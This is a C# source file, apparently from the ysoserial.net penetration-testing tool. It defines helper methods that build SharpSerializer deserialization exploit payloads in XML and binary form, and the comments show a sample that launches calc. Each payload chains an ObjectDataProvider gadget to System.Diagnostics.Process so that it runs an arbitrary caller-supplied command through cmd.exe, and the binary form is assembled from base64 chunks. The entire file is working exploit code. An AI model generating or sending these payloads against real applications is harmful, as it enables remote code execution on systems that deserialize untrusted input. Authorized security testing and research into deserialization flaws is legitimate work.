namespace ysoserial.Helpers.SharpSerializerHelpers
{
    using System;
    using System.Collections.Generic;
    using System.Text;

    /// <summary>
    /// Helper methods for sharp serialization exploit gadget generation.
    /// </summary>
    internal static class SharpSerializerHelperMethods
    {
        /// <summary>
        /// Generates the SharpSerializer XML payload with a supplied command.
        /// </summary>
        /// <param name="command">The command</param>
        /// <returns>The payload byte array.</returns>
        /// <remarks>
        /// 
        /// Standard SharpSerializer XML version of ObjectDataProvider "calc" serialized object:
        /// 
        /// <Complex name="Root" type="System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
        ///   <Properties>
        ///     <Complex name="ObjectInstance" type="System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        ///       <Properties>
        ///         <Complex name="StartInfo">
        ///           <Properties>
        ///             <Simple name="FileName" value="cmd.exe" />
        ///             <Simple name="Arguments" value="/c calc" />
        ///           </Properties>
        ///         </Complex>
        ///       </Properties>
        ///     </Complex>
        ///     <Simple name="MethodName" value="Start" />
        ///   </Properties>
        /// </Complex>
        /// 
        /// </remarks>
        internal static string GenerateSharpSerializerXmlPayload(string command)
        {
            return
                $"<Complex name=\"Root\" type=\"System.Windows.Data.ObjectDataProvider, " +
                $"PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToke" +
                $"n=31bf3856ad364e35\"><Properties><Complex name=\"ObjectInstance\" type" +
                $"=\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutra" +
                $"l, PublicKeyToken=b77a5c561934e089\"><Properties><Complex name=\"Start" +
                $"Info\"><Properties><Simple name=\"FileName\" value=\"cmd.exe\" /><Simp" +
                $"le name=\"Arguments\" value=\"/c {command}\" /></Properties></Complex>" +
                $"</Properties></Complex><Simple name=\"MethodName\" value=\"Start\" /><" +
                $"/Properties></Complex>";
        }

        /// <summary>
        /// Generates the SharpSerializer binary payload with a supplied command.
        /// </summary>
        /// <param name="command">The command</param>
        /// <returns>The payload byte array.</returns>
        /// <remarks>
        /// 
        /// Standard SharpSerializer version of ObjectDataProvider "calc" serialized object hex view:
        /// 
        /// 00000000  01 06 01 04 52 6F 6F 74 01 0E 4F 62 6A 65 63 74  ....Root..Object
        /// 00000010  49 6E 73 74 61 6E 63 65 01 09 53 74 61 72 74 49  Instance..StartI
        /// 00000020  6E 66 6F 01 08 46 69 6C 65 4E 61 6D 65 01 09 41  nfo..FileName..A
        /// 00000030  72 67 75 6D 65 6E 74 73 01 0A 4D 65 74 68 6F 64  rguments..Method
        /// 00000040  4E 61 6D 65 01 03 01 80 01 53 79 73 74 65 6D 2E  Name...€.System.
        /// 00000050  57 69 6E 64 6F 77 73 2E 44 61 74 61 2E 4F 62 6A  Windows.Data.Obj
        /// 00000060  65 63 74 44 61 74 61 50 72 6F 76 69 64 65 72 2C  ectDataProvider,
        /// 00000070  20 50 72 65 73 65 6E 74 61 74 69 6F 6E 46 72 61   PresentationFra
        /// 00000080  6D 65 77 6F 72 6B 2C 20 56 65 72 73 69 6F 6E 3D  mework, Version=
        /// 00000090  34 2E 30 2E 30 2E 30 2C 20 43 75 6C 74 75 72 65  4.0.0.0, Culture
        /// 000000A0  3D 6E 65 75 74 72 61 6C 2C 20 50 75 62 6C 69 63  =neutral, Public
        /// 000000B0  4B 65 79 54 6F 6B 65 6E 3D 33 31 62 66 33 38 35  KeyToken=31bf385
        /// 000000C0  36 61 64 33 36 34 65 33 35 01 65 53 79 73 74 65  6ad364e35.eSyste
        /// 000000D0  6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 2E 50 72  m.Diagnostics.Pr
        /// 000000E0  6F 63 65 73 73 2C 20 53 79 73 74 65 6D 2C 20 56  ocess, System, V
        /// 000000F0  65 72 73 69 6F 6E 3D 34 2E 30 2E 30 2E 30 2C 20  ersion=4.0.0.0, 
        /// 00000100  43 75 6C 74 75 72 65 3D 6E 65 75 74 72 61 6C 2C  Culture=neutral,
        /// 00000110  20 50 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D   PublicKeyToken=
        /// 00000120  62 37 37 61 35 63 35 36 31 39 33 34 65 30 38 39  b77a5c561934e089
        /// 00000130  00 02 00 00 01 02 02 01 01 01 01 01 01 02 01 02  ................
        /// 00000140  01 02 01 02 06 01 03 01 02 01 07 63 6D 64 2E 65  ...........cmd.e
        /// 00000150  78 65 06 01 04 01 02 01 07 2F 63 20 63 61 6C 63  xe......./c calc
        /// 00000160  06 01 05 01 02 01 05 53 74 61 72 74              .......Start
        /// 
        /// </remarks>
        internal static byte[] GenerateSharpSerializerBinaryPayload(string command)
        {
            // First chunk of binary-serialized ObjectDataProvider bytes.
            IEnumerable<byte> firstPayloadPart =
                Convert.FromBase64String("" +
                    "AQYBBFJvb3QBDk9iamVjdEluc3RhbmNlAQlTdGFydEluZm8BCEZpbGVOYW1lAQlB" +
                    "cmd1bWVudHMBCk1ldGhvZE5hbWUBAwGAAVN5c3RlbS5XaW5kb3dzLkRhdGEuT2Jq" +
                    "ZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249" +
                    "NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1" +
                    "NmFkMzY0ZTM1AWVTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBW" +
                    "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49" +
                    "Yjc3YTVjNTYxOTM0ZTA4OQACAAABAgIBAQEBAQECAQIBAgECBgEDAQIBB2NtZC5l" +
                    "eGUGAQQBAgE=");

            // Bytes that include the cmd, arguments and length data.
            // [2 bytes 7-bit-encoded length]["/c "][<cmd>]
            byte[] cmdArgumentsPartBytes = Encoding.ASCII.GetBytes("/c ");
            byte[] commandBytes = Encoding.ASCII.GetBytes(command);
            IEnumerable<byte> commandLengthBytes = Get7BitEncodedIntegerBytes(cmdArgumentsPartBytes.Length + commandBytes.Length);

            // Second chunk of binary-serialized ObjectDataProvider bytes.
            IEnumerable<byte> secondPayloadPart = Convert.FromBase64String("BgEFAQIBBVN0YXJ0");

            List<byte> payload = new List<byte>();
            payload.AddRange(firstPayloadPart);
            payload.AddRange(commandLengthBytes);
            payload.AddRange(cmdArgumentsPartBytes);
            payload.AddRange(commandBytes);
            payload.AddRange(secondPayloadPart);
            return payload.ToArray();
        }

        /// <summary>
        /// Gets the bytes of the 7-bit integer representation of the supplied value.
        /// </summary>
        /// <param name="value">The value to retrieve the bytes for.</param>
        /// <returns>The byte array.</returns>
        private static IEnumerable<byte> Get7BitEncodedIntegerBytes(int value)
        {
            List<byte> bytes = new List<byte>();

            uint num;
            for (num = (uint)value; num >= 128U; num >>= 7)
            {
                bytes.Add((byte)(num | 128U));
            }

            bytes.Add((byte)num);
            return bytes;
        }
    }
}